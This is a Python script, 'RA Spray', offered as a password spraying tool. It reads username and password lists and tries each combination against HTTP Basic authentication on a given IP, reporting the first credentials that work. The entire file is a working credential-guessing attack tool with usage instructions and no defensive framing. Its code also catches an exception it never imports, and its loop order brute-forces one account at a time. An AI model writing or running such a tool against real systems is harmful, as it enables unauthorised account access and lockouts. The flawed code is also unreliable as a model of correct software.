#!/usr/bin/env python3

import sys
import requests
from requests.auth import HTTPBasicAuth

# Define the tool's name and version
TOOL_NAME = "RA Spray"  # We will definitely change this. Also a coincidence that our initials match a gun but yes, we will change this...unless...
VERSION = "1.0.0"

# Function to display help message
def display_help():
    help_text = f"""
    {TOOL_NAME} - Password Spraying Tool (v{VERSION})
    
    Usage: {TOOL_NAME} [options]

    Options:
        -h, --help      Show this help message and exit
        -u, --users     Specify the file containing usernames
        -p, --pass      Specify the file containing passwords
        -i, --ip        Specify the target IP address
        --version       Show the tool version and exit
    """
    print(help_text)

# Function to display the version
def display_version():
    print(f"{TOOL_NAME} version {VERSION}")

# Function to perform password spraying
def password_spraying(ip_address, username_file, password_file):
    # Open the username and password files
    with open(username_file, 'r') as user_file:
        usernames = [line.strip() for line in user_file.readlines()]
    
    with open(password_file, 'r') as pass_file:
        passwords = [line.strip() for line in pass_file.readlines()]
    
    # Loop through each username and password combination
    for username in usernames:
        for password in passwords:
            # Print the attempt (optional)
            print(f"Trying username: {username}, password: {password}")
            
            try:
                # Send the request with basic authentication
                response = requests.get(f'http://{ip_address}', auth=HTTPBasicAuth(username, password), timeout=5)
                
                # Check if the authentication was successful
                if response.status_code == 200:
                    print(f"Success! Username: {username}, Password: {password}")
                    return  # Exit after the first success (optional)
                else:
                    print(f"Failed for Username: {username}, Password: {password}")
            
            except RequestException as e:
                # Handle network-related errors, such as connection timeout or unreachable IP
                print(f"Connection failed for IP {ip_address}. Error: {e}")

# Main function
def main():
    # Check if the user requested help or version
    if len(sys.argv) > 1:
        if sys.argv[1] in ['-h', '--help']:
            display_help()
            sys.exit(0)
        elif sys.argv[1] == '--version':
            display_version()
            sys.exit(0)
    
    # Check if the required arguments are provided
    if '-u' not in sys.argv or '-p' not in sys.argv or '-i' not in sys.argv:
        print("Missing required arguments! Use --help for usage instructions.")
        sys.exit(1)
    
    # Get the values of the provided arguments
    try:
        ip_address = sys.argv[sys.argv.index('-i') + 1]
        username_file = sys.argv[sys.argv.index('-u') + 1]
        password_file = sys.argv[sys.argv.index('-p') + 1]
    except (ValueError, IndexError):
        print("Invalid arguments! Use --help for usage instructions.")
        sys.exit(1)
    
    # Call the password spraying function
    password_spraying(ip_address, username_file, password_file)

if __name__ == '__main__':
    main()
